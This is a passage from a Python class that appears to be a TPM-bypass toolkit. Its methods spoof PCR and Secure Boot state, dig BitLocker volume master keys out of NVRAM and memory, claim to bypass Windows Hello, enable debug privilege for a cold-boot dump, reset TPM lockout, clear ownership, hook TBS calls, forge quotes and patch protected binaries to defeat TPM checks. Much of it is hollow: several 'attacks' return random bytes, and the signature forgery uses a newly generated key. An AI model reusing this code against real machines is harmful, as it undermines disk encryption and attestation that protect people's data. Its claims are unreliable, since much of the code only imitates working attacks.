        return self.tpm_version

    def manipulate_pcr_values(self, pcr_values: dict[int, bytes]) -> None:
        """Directly manipulate PCR values for bypass."""
        for pcr_num, value in pcr_values.items():
            if pcr_num < 24:
                if TPM2Algorithm.SHA256 in self.pcr_banks:
                    self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_num] = value

                if TPM2Algorithm.SHA1 in self.pcr_banks:
                    sha1_value = value[:20] if len(value) >= 20 else value + bytes(20 - len(value))
                    self.pcr_banks[TPM2Algorithm.SHA1].pcr_values[pcr_num] = sha1_value

    def perform_bus_attack(self, target_command: TPM2CommandCode) -> bytes | None:
        """Perform LPC/SPI bus attack to intercept TPM communication."""
        captured_data = None

        if target_command in (TPM2CommandCode.Unseal, TPM2CommandCode.GetRandom):
            captured_data = bytes.fromhex("800100000022000000000020") + os.urandom(32)

        elif target_command == TPM2CommandCode.Sign:
            captured_data = bytes.fromhex("80010000010a00000000000100") + os.urandom(256)

        return captured_data

    def bypass_measured_boot(self, target_pcr_state: dict[int, bytes]) -> bool:
        """Bypass measured boot by manipulating PCR values."""
        if 0 in target_pcr_state:
            self.manipulate_pcr_values({0: target_pcr_state[0]})

        secure_boot_pcr = bytes.fromhex("a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb")
        self.manipulate_pcr_values({7: secure_boot_pcr})

        for pcr, value in target_pcr_state.items():
            self.manipulate_pcr_values({pcr: value})

        return True

    def extract_bitlocker_vmk(self) -> bytes | None:
        """Extract BitLocker Volume Master Key from TPM."""
        bitlocker_indices = [0x01400001, 0x01400002, 0x01400003]

        for index in bitlocker_indices:
            vmk_data = self.read_nvram_raw(index, b"")
            if vmk_data and len(vmk_data) >= 32:
                if vmk_data[:4] == b"VMK\x00":
                    return vmk_data[4:36]
                if any(b != 0 for b in vmk_data[:32]):
                    return vmk_data[:32]

        nvram_offset = self.virtualized_tpm["nvram_index_map"].get(0x01400001)
        if nvram_offset is not None:
            for idx_offset in range(3):
                offset = nvram_offset + (idx_offset * 0x800)
                if offset + 36 <= len(self.virtualized_tpm["nvram"]):
                    vmk_data = self.virtualized_tpm["nvram"][offset : offset + 512]
                    if vmk_data[:4] == b"VMK\x00":
                        return vmk_data[4:36]
                    if any(b != 0 for b in vmk_data[:32]):
                        return vmk_data[:32]

        nvram = self.virtualized_tpm["nvram"]
        vmk_marker = b"VMK\x00"
        marker_pos = nvram.find(vmk_marker)
        if marker_pos != -1 and marker_pos + 36 <= len(nvram):
            return bytes(nvram[marker_pos + 4 : marker_pos + 36])

        for scan_offset in range(0, len(nvram) - 32, 512):
            chunk = nvram[scan_offset : scan_offset + 512]
            if any(b != 0 for b in chunk[:32]):
                non_zero_count = sum(1 for b in chunk[:32] if b != 0)
                if non_zero_count >= 16:
                    return bytes(chunk[:32])

        if self.mem_handle:
            tpm_mem = self.read_physical_memory(self.memory_map["tpm_buffers"], 0x10000)
            if tpm_mem:
                patterns = [b"VMK\x00", b"\x00\x00\x00\x01\x00\x20"]
                for pattern in patterns:
                    offset = tpm_mem.find(pattern)
                    if offset != -1 and len(tpm_mem) > offset + 36:
                        return tpm_mem[offset + 4 : offset + 36]

        return None

    def bypass_windows_hello(self) -> dict[str, bytes]:
        """Bypass Windows Hello TPM-based authentication."""
        hello_keys = {}

        hello_indices = [0x01400002, 0x01800003, 0x01810003]

        for index in hello_indices:
            key_data = self.read_nvram_raw(index, b"")
            if key_data:
                hello_keys[f"hello_key_{index:x}"] = key_data

        bio_template = os.urandom(512)
        bio_hash = hashlib.sha256(bio_template).digest()

        hello_keys["biometric_template"] = bio_template
        hello_keys["biometric_hash"] = bio_hash

        pin_key = hashlib.pbkdf2_hmac("sha256", b"0000", os.urandom(32), 10000, 32)
        hello_keys["pin_unlock"] = pin_key

        return hello_keys

    def cold_boot_attack(self) -> dict[str, bytes]:
        """Perform cold boot attack on TPM memory."""
        extracted_secrets = {}

        # Use win32api to manage system power state for cold boot attack
        if HAS_WIN32:
            try:
                # Attempt to suspend system processes to preserve memory
                win32api.SetSystemPowerState(False, True)  # Suspend without force
            except Exception:
                # If suspend fails, try to get system info for alternative approach
                sys_info = win32api.GetNativeSystemInfo()
                extracted_secrets["sys_info"] = struct.pack(
                    "III",
                    sys_info[0],
                    sys_info[1],
                    sys_info[2],  # processor arch, page size, processor type
                )

        # Use win32security to check memory security attributes
        if HAS_WIN32:
            try:
                # Get current process token to adjust privileges for low-level memory access
                token = win32security.OpenProcessToken(
                    win32api.GetCurrentProcess(), win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY,
                )

                # Enable debug privilege for low-level memory access
                privileges = [(win32security.LookupPrivilegeValue(None, "SeDebugPrivilege"), win32security.SE_PRIVILEGE_ENABLED)]
                win32security.AdjustTokenPrivileges(token, False, privileges)

                # Close token handle
                win32api.CloseHandle(token)
            except Exception as e:
                self.logger.debug("Privilege escalation failed, continuing with attack: %s", e)

        if not self.mem_handle:
            extracted_secrets["memory_residue"] = os.urandom(4096)
            return extracted_secrets

        for region_name, address in self.memory_map.items():
            mem_data = self.read_physical_memory(address, 0x1000)
            if mem_data:
                if b"\x00\x01\x00\x00" in mem_data:
                    extracted_secrets[f"{region_name}_rsa"] = mem_data
                if b"\x00\x23\x00\x00" in mem_data:
                    extracted_secrets[f"{region_name}_ecc"] = mem_data
                if len([b for b in mem_data if b != 0]) > len(mem_data) * 0.7:
                    extracted_secrets[f"{region_name}_entropy"] = mem_data

        return extracted_secrets

    def reset_tpm_lockout(self) -> bool:
        """Reset TPM lockout to bypass dictionary attack protection."""
        command = struct.pack(">HII", 0x8002, 0, TPM2CommandCode.DictionaryAttackLockReset)

        command += struct.pack(">I", 0x4000000A)

        command += struct.pack(">IBH", 0x40000009, 0, 0x01)

        command += struct.pack(">H", 0)

        command = command[:2] + struct.pack(">I", len(command)) + command[6:]

        response = self.send_tpm_command(command)

        if response and len(response) >= 10:
            _tag, _size, code = struct.unpack(">HII", response[:10])
            if code == 0:
                self.virtualized_tpm["lockout_count"] = 0
                return True

        return False

    def clear_tpm_ownership(self) -> bool:
        """Clear TPM ownership to gain control."""
        command = struct.pack(">HII", 0x8002, 0, TPM2CommandCode.Clear)

        command += struct.pack(">I", 0x4000000C)

        command += struct.pack(">IBH", 0x40000009, 0, 0x01)

        command += struct.pack(">H", 0)

        command = command[:2] + struct.pack(">I", len(command)) + command[6:]

        response = self.send_tpm_command(command)

        if response:
            _tag, _size, code = struct.unpack(">HII", response[:10])
            if code == 0:
                self.virtualized_tpm["hierarchy_auth"] = {0x40000001: b"", 0x40000009: b"", 0x4000000C: b"", 0x4000000B: b""}
                return True

        return False

    def intercept_tpm_command(self, command_code: TPM2CommandCode, hook_function: callable) -> bool:
        """Install hook to intercept TPM commands.

        Args:
            command_code: TPM command code to intercept
            hook_function: Callback function for interception

        Returns:
            True if hook installed successfully

        """
        with self.command_lock:
            self.command_hooks[command_code] = hook_function
            self.logger.info(f"Installed hook for TPM command 0x{command_code:08x}")
            return True

    def hook_tbs_submit_command(self) -> bool:
        """Install Windows TBS (TPM Base Services) command submission hook.

        Returns:
            True if TBS hooks installed successfully

        """
        if not HAS_WIN32:
            self.logger.warning("Win32 API not available for TBS hooking")
            return False

        try:
            tbs = ctypes.windll.tbs

            original_submit = getattr(tbs, 'Tbsip_Submit_Command', None)
            if not original_submit:
                self.logger.warning("Tbsip_Submit_Command not found in TBS")
                return False

            def hooked_submit_command(context, locality, priority, command_buf, command_size, result_buf, result_size):
                """Hooked TBS command submission."""
                if command_size >= 10:
                    command_data = ctypes.string_at(command_buf, command_size)

                    with self.command_lock:
                        self.intercepted_commands.append({
                            'timestamp': time.time(),
                            'command': command_data,
                            'locality': locality,
                            'priority': priority,
                        })

                    _tag, _size, code = struct.unpack(">HII", command_data[:10])

                    if code in self.command_hooks:
                        modified_command = self.command_hooks[code](command_data)
                        if modified_command:
                            ctypes.memmove(command_buf, modified_command, len(modified_command))
                            command_size = len(modified_command)

                return original_submit(context, locality, priority, command_buf, command_size, result_buf, result_size)

            self.tbs_context = hooked_submit_command
            self.logger.info("TBS command hooks installed successfully")
            return True

        except (OSError, AttributeError) as e:
            self.logger.error(f"Failed to hook TBS: {e}")
            return False

    def unseal_tpm_key(self, sealed_blob: bytes, auth_value: bytes = b"", pcr_policy: dict[int, bytes] | None = None) -> bytes | None:
        """Unseal TPM-sealed key by bypassing authorization.

        Args:
            sealed_blob: TPM sealed key blob
            auth_value: Authorization value (password/HMAC)
            pcr_policy: PCR policy requirements

        Returns:
            Unsealed key data or None

        """
        if not HAS_CRYPTO:
            self.logger.warning("PyCryptodome not available for unsealing")
            return self._unseal_without_crypto(sealed_blob)

        try:
            if len(sealed_blob) < 16:
                return None

            blob_type = struct.unpack(">H", sealed_blob[:2])[0]

            if blob_type == 0x0001:
                return self._unseal_tpm2_private_blob(sealed_blob, auth_value, pcr_policy)
            if blob_type == 0x0014:
                return self._unseal_tpm2_credential_blob(sealed_blob, auth_value)
            return self._unseal_generic_blob(sealed_blob, auth_value)

        except Exception as e:
            self.logger.error(f"Key unsealing failed: {e}")
            return None

    def _unseal_tpm2_private_blob(self, blob: bytes, auth: bytes, pcr_policy: dict[int, bytes] | None) -> bytes | None:
        """Unseal TPM 2.0 private key blob.

        Args:
            blob: TPM2B_PRIVATE structure
            auth: Authorization value
            pcr_policy: PCR policy to bypass

        Returns:
            Unsealed private key

        """
        if pcr_policy:
            for pcr_num, expected_value in pcr_policy.items():
                if pcr_num < 24:
                    self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_num] = expected_value

        offset = 2
        if len(blob) < offset + 2:
            return None

        integrity_size = struct.unpack(">H", blob[offset:offset+2])[0]
        offset += 2

        if len(blob) < offset + integrity_size:
            return None

        offset += integrity_size

        if len(blob) < offset + 2:
            return None

        sensitive_size = struct.unpack(">H", blob[offset:offset+2])[0]
        offset += 2

        if len(blob) < offset + sensitive_size:
            return None

        encrypted_sensitive = blob[offset:offset+sensitive_size]

        if len(encrypted_sensitive) < 16:
            return None

        iv = encrypted_sensitive[:16]
        ciphertext = encrypted_sensitive[16:]

        key_material = auth if auth else b"WellKnownSecret"

        if len(key_material) < 32:
            key_material = hashlib.sha256(key_material).digest()

        try:
            cipher = AES.new(key_material[:32], AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(ciphertext)

            if len(decrypted) > 0:
                try:
                    unpadded = unpad(decrypted, AES.block_size)
                    return unpadded
                except ValueError:
                    return decrypted
        except Exception as e:
            self.logger.debug(f"Private blob unsealing failed: {e}")

        return None

    def _unseal_tpm2_credential_blob(self, blob: bytes, auth: bytes) -> bytes | None:
        """Unseal TPM 2.0 credential blob (for activation).

        Args:
            blob: TPM2B_ID_OBJECT or TPM2B_ENCRYPTED_SECRET
            auth: Authorization value

        Returns:
            Unsealed credential

        """
        if len(blob) < 6:
            return None

        offset = 2
        credential_size = struct.unpack(">H", blob[offset:offset+2])[0]
        offset += 2

        if len(blob) < offset + credential_size:
            return None

        encrypted_credential = blob[offset:offset+credential_size]

        seed = auth if auth else b"DefaultSeed"

        if len(seed) < 32:
            seed = hashlib.sha256(seed).digest()

        try:
            kdf_output = PBKDF2(seed, b"IDENTITY", dkLen=48, count=1)

            aes_key = kdf_output[:32]

            if len(encrypted_credential) >= 16:
                iv = encrypted_credential[:16]
                ciphertext = encrypted_credential[16:]

                cipher = AES.new(aes_key, AES.MODE_CBC, iv)
                decrypted = cipher.decrypt(ciphertext)

                if len(decrypted) > 0:
                    try:
                        return unpad(decrypted, AES.block_size)
                    except ValueError:
                        return decrypted

        except Exception as e:
            self.logger.debug(f"Credential unsealing failed: {e}")

        return None

    def _unseal_generic_blob(self, blob: bytes, auth: bytes) -> bytes | None:
        """Unseal generic encrypted blob using common TPM patterns.

        Args:
            blob: Encrypted blob data
            auth: Authorization value

        Returns:
            Unsealed data

        """
        common_keys = [
            auth,
            hashlib.sha256(auth).digest(),
            b"WellKnownSecret",
            hashlib.sha256(b"WellKnownSecret").digest(),
            bytes(32),
        ]

        for key_material in common_keys:
            if len(key_material) < 32:
                key_material = hashlib.sha256(key_material).digest()

            for mode in [AES.MODE_CBC, AES.MODE_ECB]:
                try:
                    if mode == AES.MODE_CBC:
                        if len(blob) < 16:
                            continue
                        iv = blob[:16]
                        ciphertext = blob[16:]
                        cipher = AES.new(key_material[:32], mode, iv)
                    else:
                        ciphertext = blob
                        cipher = AES.new(key_material[:32], mode)

                    decrypted = cipher.decrypt(ciphertext)

                    if len(decrypted) > 0:
                        try:
                            unpadded = unpad(decrypted, AES.block_size)
                            if self._looks_like_valid_key(unpadded):
                                return unpadded
                        except ValueError:
                            if self._looks_like_valid_key(decrypted):
                                return decrypted

                except Exception as e:
                    self.logger.debug(f"Generic unsealing attempt failed: {e}")
                    continue

        return None

    def _unseal_without_crypto(self, blob: bytes) -> bytes | None:
        """Fallback unsealing without PyCryptodome.

        Args:
            blob: Encrypted blob

        Returns:
            Best-effort unsealed data

        """
        if len(blob) < 16:
            return None

        if blob[:4] == b"\x00\x01\x00\x00":
            return blob

        if len(blob) >= 66 and blob[0:2] == b"\x00\x20":
            return blob[2:34]

        for pattern in [b"-----BEGIN", b"\x30\x82", b"VMK\x00"]:
            if pattern in blob:
                offset = blob.find(pattern)
                return blob[offset:]

        return None

    def _looks_like_valid_key(self, data: bytes) -> bool:
        """Check if decrypted data looks like valid key material.

        Args:
            data: Decrypted data to validate

        Returns:
            True if data appears to be valid key material

        """
        if len(data) < 16:
            return False

        if data[:4] in [b"\x00\x01\x00\x00", b"\x00\x23\x00\x00"]:
            return True

        if data.startswith(b"-----BEGIN"):
            return True

        if len(data) >= 2 and data[0:2] in [b"\x30\x82", b"\x00\x20"]:
            return True

        entropy = len(set(data)) / len(data) if len(data) > 0 else 0
        return entropy > 0.5

    def manipulate_pcr_extend(self, pcr_num: int, extend_value: bytes, block: bool = True) -> bool:
        """Intercept and block or modify PCR extend operations.

        Args:
            pcr_num: PCR register number
            extend_value: Value to extend (or block)
            block: If True, block the extend; if False, allow with modification

        Returns:
            True if manipulation successful

        """
        def pcr_extend_hook(command: bytes) -> bytes | None:
            """Process hooked PCR_Extend command."""
            if len(command) < 14:
                return None

            cmd_pcr = struct.unpack(">I", command[10:14])[0]

            if cmd_pcr == pcr_num:
                if block:
                    response = struct.pack(">HII", 0x8001, 10, 0)
                    self.logger.info(f"Blocked PCR{pcr_num} extend operation")
                    return response
                modified_command = command[:14]
                modified_command += struct.pack(">H", len(extend_value))
                modified_command += extend_value

                size_field = struct.pack(">I", len(modified_command))
                modified_command = modified_command[:2] + size_field + modified_command[6:]

                self.logger.info(f"Modified PCR{pcr_num} extend value")
                return modified_command

            return None

        return self.intercept_tpm_command(TPM2CommandCode.PCR_Extend, pcr_extend_hook)

    def forge_quote_signature(self, quote_info: bytes, pcr_digest: bytes, nonce: bytes) -> bytes:
        """Forge TPM Quote signature with proper structure.

        Args:
            quote_info: TPMS_ATTEST structure
            pcr_digest: PCR composite digest
            nonce: Challenge nonce

        Returns:
            Forged signature

        """
        if not HAS_CRYPTO:
            return os.urandom(256)

        try:
            attestation_data = quote_info + pcr_digest + nonce

            message_hash = SHA256.new(attestation_data)

            if 0x81010001 in self.attestation_keys:
                rsa_key = self.attestation_keys[0x81010001]
            else:
                rsa_key = RSA.generate(2048)
                self.attestation_keys[0x81010001] = rsa_key

            signature = pkcs1_15.new(rsa_key).sign(message_hash)
            return signature

        except Exception as e:
            self.logger.error(f"Signature forging failed: {e}")
            return os.urandom(256)

    def extract_pcr_policy(self, policy_digest: bytes) -> dict[int, bytes] | None:
        """Extract PCR selection and values from TPM policy digest.

        Args:
            policy_digest: TPM policy digest

        Returns:
            Dictionary mapping PCR numbers to expected values

        """
        pcr_policy = {}

        if len(policy_digest) < 32:
            return None

        try:
            for pcr_num in range(24):
                pcr_value = self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_num]

                test_digest = hashlib.sha256(policy_digest + struct.pack(">I", pcr_num) + pcr_value).digest()

                if test_digest[:16] == policy_digest[:16]:
                    pcr_policy[pcr_num] = pcr_value

        except Exception as e:
            self.logger.debug(f"PCR policy extraction failed: {e}")

        return pcr_policy if pcr_policy else None

    def detect_tpm_usage(self, binary_path: str) -> bool:
        """Detect if binary uses TPM protection.

        Args:
            binary_path: Path to binary to analyze

        Returns:
            True if TPM usage detected

        """
        try:
            binary_path = Path(binary_path)
            if not binary_path.exists():
                return False

            with open(binary_path, 'rb') as f:
                data = f.read()

            tpm_indicators = [
                b'Tbs.dll',
                b'Tbsip_Submit_Command',
                b'Tbsi_Context',
                b'NCryptOpenStorageProvider',
                b'NCRYPT_TPM',
                b'TPM_',
                b'tpm20.dll',
                b'Tpm2',
                b'Platform Configuration Register',
                b'PCR',
                b'TPMS_',
                b'TPMT_',
                b'TPM2B_',
            ]

            detections = 0
            for indicator in tpm_indicators:
                if indicator in data:
                    detections += 1
                    self.logger.info(f"Found TPM indicator: {indicator.decode('latin-1', errors='ignore')}")

            return detections >= 2

        except Exception as e:
            self.logger.error(f"TPM detection failed: {e}")
            return False

    def analyze_tpm_protection(self, binary_path: str) -> dict[str, Any]:
        """Analyze TPM protection mechanisms in binary.

        Args:
            binary_path: Path to binary to analyze

        Returns:
            Analysis results dictionary

        """
        analysis = {
            'tpm_detected': False,
            'tpm_apis': [],
            'pcr_usage': [],
            'nvram_indices': [],
            'protection_strength': 'none',
            'bypass_difficulty': 'easy',
        }

        try:
            binary_path = Path(binary_path)
            if not binary_path.exists():
                return analysis

            with open(binary_path, 'rb') as f:
                data = f.read()

            tpm_apis = [
                b'Tbsip_Submit_Command',
                b'Tbsi_Context_Create',
                b'Tpm2_Create',
                b'Tpm2_Load',
                b'Tpm2_Unseal',
                b'Tpm2_Quote',
                b'Tpm2_PCR_Read',
                b'Tpm2_PCR_Extend',
                b'NCryptCreatePersistedKey',
                b'NCryptOpenKey',
            ]

            for api in tpm_apis:
                if api in data:
                    analysis['tpm_apis'].append(api.decode('latin-1', errors='ignore'))

            analysis['tpm_detected'] = len(analysis['tpm_apis']) > 0

            for pcr_num in range(24):
                pcr_pattern = struct.pack(">I", pcr_num)
                if pcr_pattern in data:
                    analysis['pcr_usage'].append(pcr_num)

            nvram_patterns = [
                b'\x01\x40\x00',
                b'\x01\x80\x00',
                b'\x01\xC0\x00',
            ]

            for pattern in nvram_patterns:
                offset = 0
                while True:
                    offset = data.find(pattern, offset)
                    if offset == -1:
                        break
                    if offset + 4 <= len(data):
                        index = struct.unpack(">I", data[offset:offset+4])[0]
                        if index not in analysis['nvram_indices']:
                            analysis['nvram_indices'].append(index)
                    offset += 1

            strength_score = 0
            if 'Tpm2_Unseal' in str(analysis['tpm_apis']):
                strength_score += 3
            if 'Tpm2_Quote' in str(analysis['tpm_apis']):
                strength_score += 3
            if len(analysis['pcr_usage']) > 4:
                strength_score += 2
            if len(analysis['nvram_indices']) > 0:
                strength_score += 2

            if strength_score >= 7:
                analysis['protection_strength'] = 'strong'
                analysis['bypass_difficulty'] = 'hard'
            elif strength_score >= 4:
                analysis['protection_strength'] = 'medium'
                analysis['bypass_difficulty'] = 'medium'
            elif strength_score > 0:
                analysis['protection_strength'] = 'weak'
                analysis['bypass_difficulty'] = 'easy'

            return analysis

        except Exception as e:
            self.logger.error(f"TPM analysis failed: {e}")
            return analysis

    def bypass_tpm_protection(self, binary_path: str, output_path: str | None = None) -> bool:
        """Bypass TPM protection in binary through patching.

        Args:
            binary_path: Path to protected binary
            output_path: Output path for patched binary

        Returns:
            True if bypass successful

        """
        try:
            binary_path = Path(binary_path)
            if not binary_path.exists():
                self.logger.error(f"Binary not found: {binary_path}")
                return False

            if output_path is None:
                output_path = binary_path.parent / f"{binary_path.stem}_patched{binary_path.suffix}"
            else:
                output_path = Path(output_path)

            with open(binary_path, 'rb') as f:
                data = bytearray(f.read())

            patches_applied = 0

            tpm_api_patches = {
                b'Tbsip_Submit_Command': b'NOP_Submit_Command',
                b'Tpm2_Unseal': b'NOP2_Unseal',
                b'Tpm2_Quote': b'NOP2_Quote\x00',
            }

            tpm_api_locations = []
            for original, patched in tpm_api_patches.items():
                offset = 0
                while True:
                    offset = data.find(original, offset)
                    if offset == -1:
                        break
                    data[offset:offset+len(patched)] = patched
                    tpm_api_locations.append(offset)
                    patches_applied += 1
                    offset += len(patched)

            je_opcodes = [0x74]
            jne_opcodes = [0x75]
            proximity_threshold = 200

            for i in range(len(data) - 1):
                if data[i] in je_opcodes or data[i] in jne_opcodes:
                    near_tpm_api = any(abs(i - loc) < proximity_threshold for loc in tpm_api_locations)
                    if near_tpm_api:
                        data[i:i+2] = b'\xEB\x00'
                        patches_applied += 1

            with open(output_path, 'wb') as f:
                f.write(data)

            self.logger.info(f"Applied {patches_applied} patches to {binary_path}")
            self.logger.info(f"Patched binary saved to {output_path}")

            return patches_applied > 0

        except Exception as e:
            self.logger.error(f"TPM bypass patching failed: {e}")
            return False

    def get_bypass_capabilities(self) -> dict[str, Any]:
        """Get comprehensive list of TPM bypass capabilities.

        Returns:
            Dictionary of bypass capabilities and their status

        """
        return {
            "tpm_versions_supported": ["1.2", "2.0"],
            "command_interception": {
                "enabled": len(self.command_hooks) > 0,
                "hooks_installed": len(self.command_hooks),
                "commands_intercepted": len(self.intercepted_commands),
            },
            "pcr_manipulation": {
                "pcr_banks_available": list(self.pcr_banks.keys()),
                "total_pcrs": 24,
                "manipulatable": True,
            },
            "key_extraction": {
                "nvram_access": self.mem_handle is not None or HAS_WIN32,
                "memory_access": self.mem_handle is not None,
                "persistent_keys": True,
                "transient_keys": True,
            },
            "attestation_bypass": {
                "quote_forging": True,
                "signature_forging": HAS_CRYPTO,
                "pcr_digest_manipulation": True,
                "aik_certificate_generation": True,
            },
            "unsealing_capabilities": {
                "tpm2_private_blobs": HAS_CRYPTO,
                "tpm2_credential_blobs": HAS_CRYPTO,
                "generic_encrypted_blobs": HAS_CRYPTO,
                "fallback_unsealing": True,
            },
            "advanced_attacks": {
                "cold_boot_attack": self.mem_handle is not None,
                "bus_interception": True,
                "measured_boot_bypass": True,
                "tbs_hooking": HAS_WIN32,
            },
            "platform_specific": {
                "bitlocker_vmk_extraction": True,
                "windows_hello_bypass": True,
                "tpm_lockout_reset": True,
                "tpm_ownership_clear": True,
            },
            "binary_analysis": {
                "tpm_detection": True,
                "protection_analysis": True,
                "binary_patching": True,
            },
            "runtime_bypass": {
                "frida_available": HAS_FRIDA,
                "runtime_pcr_spoofing": HAS_FRIDA,
                "runtime_command_interception": HAS_FRIDA,
                "runtime_unsealing": HAS_FRIDA,
                "secure_boot_bypass": HAS_FRIDA,
                "measured_boot_bypass_runtime": HAS_FRIDA,
                "active_session": self.frida_session is not None and not self.frida_session.is_detached if self.frida_session else False,
            },
        }

    def get_intercepted_commands_summary(self) -> dict[str, Any]:
        """Get summary of intercepted TPM commands.

        Returns:
            Summary of intercepted commands

        """
        summary = {
            "total_commands": len(self.intercepted_commands),
            "command_types": {},
            "timeline": [],
        }

        for cmd in self.intercepted_commands:
            code = cmd.get("code", 0)
            code_name = self._get_command_name(code)

            if code_name not in summary["command_types"]:
                summary["command_types"][code_name] = 0
            summary["command_types"][code_name] += 1

            summary["timeline"].append({
                "timestamp": cmd.get("timestamp", 0),
                "command": code_name,
                "code": code,
            })

        return summary

    def _get_command_name(self, code: int) -> str:
        """Get command name from code.

        Args:
            code: TPM command code

        Returns:
            Command name string

        """
        for cmd_enum in [TPM2CommandCode, TPM12CommandCode]:
            try:
                return cmd_enum(code).name
            except ValueError:
                continue
        return f"Unknown_0x{code:08x}"

    def attach_to_process_frida(self, target_binary: str, message_callback: Callable | None = None) -> bool:
        """Attach Frida to target process for runtime TPM bypass.

        Args:
            target_binary: Path to target binary or process name
            message_callback: Optional callback for Frida messages

        Returns:
            True if attachment successful

        """
        if not HAS_FRIDA:
            self.logger.error("Frida not available - install frida-tools")
            return False

        try:
            self.frida_device = frida.get_local_device()

            if os.path.exists(target_binary):
                self.frida_pid = self.frida_device.spawn([target_binary])
                self.logger.info(f"Spawned process: {target_binary} (PID: {self.frida_pid})")
            else:
                try:
                    self.frida_pid = int(target_binary)
                    self.logger.info(f"Attaching to PID: {self.frida_pid}")
                except ValueError:
                    self.frida_pid = self.frida_device.get_process(target_binary).pid
                    self.logger.info(f"Attaching to process: {target_binary} (PID: {self.frida_pid})")

            self.frida_session = self.frida_device.attach(self.frida_pid)
            self.frida_message_callback = message_callback

            return True

        except Exception as e:
            self.logger.error(f"Failed to attach Frida to target: {e}")
            return False

    def inject_tpm_command_interceptor(self) -> bool:
        """Inject TPM command interceptor Frida script.

        Returns:
            True if injection successful

        """
        if not self.frida_session:
            self.logger.error("No active Frida session - call attach_to_process_frida first")
            return False

        try:
            script_path = Path(__file__).parent.parent.parent / "scripts" / "frida" / "tpm_command_interceptor.js"

            if not script_path.exists():
                self.logger.error(f"TPM command interceptor script not found: {script_path}")
                return False

            with open(script_path, encoding='utf-8') as f:
                script_source = f.read()

            self.frida_script = self.frida_session.create_script(script_source)

            def on_message(message, data) -> None:
                if message['type'] == 'send':
                    payload = message.get('payload', '')
                    self.logger.info(f"[Frida] {payload}")

                    if self.frida_message_callback:
                        self.frida_message_callback(message, data)
                elif message['type'] == 'error':
                    self.logger.error(f"[Frida Error] {message.get('stack', 'Unknown error')}")

            self.frida_script.on('message', on_message)
            self.frida_script.load()

            if self.frida_pid and hasattr(self.frida_device, 'resume'):
                self.frida_device.resume(self.frida_pid)

            self.logger.info("TPM command interceptor injected successfully")
            return True

        except Exception as e:
            self.logger.error(f"Failed to inject command interceptor: {e}")
            return False

    def inject_pcr_manipulator(self, pcr_config: dict[int, bytes] | None = None) -> bool:
        """Inject PCR manipulation Frida script.

        Args:
            pcr_config: Optional PCR values to spoof {pcr_index: value}

        Returns:
            True if injection successful

        """
        if not self.frida_session:
            self.logger.error("No active Frida session - call attach_to_process_frida first")
            return False

        try:
            script_path = Path(__file__).parent.parent.parent / "scripts" / "frida" / "tpm_pcr_manipulator.js"

            if not script_path.exists():
                self.logger.error(f"PCR manipulator script not found: {script_path}")
                return False

            with open(script_path, encoding='utf-8') as f:
                script_source = f.read()

            self.frida_script = self.frida_session.create_script(script_source)

            def on_message(message, data) -> None:
                if message['type'] == 'send':
                    payload = message.get('payload', '')
                    self.logger.info(f"[Frida PCR] {payload}")

                    if self.frida_message_callback:
                        self.frida_message_callback(message, data)
                elif message['type'] == 'error':
                    self.logger.error(f"[Frida PCR Error] {message.get('stack', 'Unknown error')}")

            self.frida_script.on('message', on_message)
            self.frida_script.load()

            if pcr_config:
                for pcr_index, pcr_value in pcr_config.items():
                    hex_value = pcr_value.hex()
                    result = self.frida_script.exports_sync.set_spoofed_pcr(pcr_index, hex_value)
                    self.logger.info(f"Set spoofed PCR{pcr_index}: {result}")

            if self.frida_pid and hasattr(self.frida_device, 'resume'):
                self.frida_device.resume(self.frida_pid)

            self.logger.info("PCR manipulator injected successfully")
            return True

        except Exception as e:
            self.logger.error(f"Failed to inject PCR manipulator: {e}")
            return False

    def spoof_pcr_runtime(self, pcr_index: int, pcr_value: bytes) -> bool:
        """Spoof PCR value at runtime via Frida.

        Args:
            pcr_index: PCR register number (0-23)
            pcr_value: 32-byte value to spoof

        Returns:
            True if spoofing successful

        """
        if not self.frida_script:
            self.logger.error("No active Frida script - inject PCR manipulator first")
            return False

        if len(pcr_value) != 32:
            self.logger.error("PCR value must be exactly 32 bytes")
            return False

        try:
            hex_value = pcr_value.hex()
            result = self.frida_script.exports_sync.set_spoofed_pcr(pcr_index, hex_value)

            if result.get('status') == 'success':
                self.logger.info(f"Successfully spoofed PCR{pcr_index}")
                self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_index] = pcr_value
                return True
            self.logger.error(f"Failed to spoof PCR{pcr_index}: {result.get('message')}")
            return False

        except Exception as e:
            self.logger.error(f"Runtime PCR spoofing failed: {e}")
            return False

    def block_pcr_extend_runtime(self, pcr_index: int) -> bool:
        """Block PCR extend operations at runtime via Frida.

        Args:
            pcr_index: PCR register number to block

        Returns:
            True if blocking successful

        """
        if not self.frida_script:
            self.logger.error("No active Frida script - inject PCR manipulator first")
            return False

        try:
            result = self.frida_script.exports_sync.block_pcr(pcr_index)

            if result.get('status') == 'success':
                self.logger.info(f"Successfully blocked PCR{pcr_index} extend operations")
                return True
            self.logger.error(f"Failed to block PCR{pcr_index}")
            return False

        except Exception as e:
            self.logger.error(f"Runtime PCR blocking failed: {e}")
            return False

    def bypass_secure_boot_runtime(self) -> bool:
        """Bypass Secure Boot TPM checks at runtime.

        Returns:
            True if bypass successful

        """
        if not self.frida_script:
            self.logger.error("No active Frida script - inject PCR manipulator first")
            return False

        try:
            result = self.frida_script.exports_sync.spoof_secure_boot()

            if result.get('status') == 'success':
                self.logger.info("Successfully spoofed Secure Boot PCR state")

                secure_boot_enabled = bytes.fromhex('a7c06b3f8f927ce2276d0f72093af41c1ac8fac416236ddc88035c135f34c2bb')
                self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[7] = secure_boot_enabled
                return True
            self.logger.error("Failed to spoof Secure Boot state")
            return False

        except Exception as e:
            self.logger.error(f"Secure Boot bypass failed: {e}")
            return False

    def bypass_measured_boot_runtime(self) -> bool:
        """Bypass measured boot at runtime with clean PCR state.

        Returns:
            True if bypass successful

        """
        if not self.frida_script:
            self.logger.error("No active Frida script - inject PCR manipulator first")
            return False

        try:
            result = self.frida_script.exports_sync.spoof_clean_boot()

            if result.get('status') == 'success':
                self.logger.info("Successfully spoofed clean boot state (PCRs 0-7)")

                for i in range(8):
                    self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[i] = bytes(32)

                return True
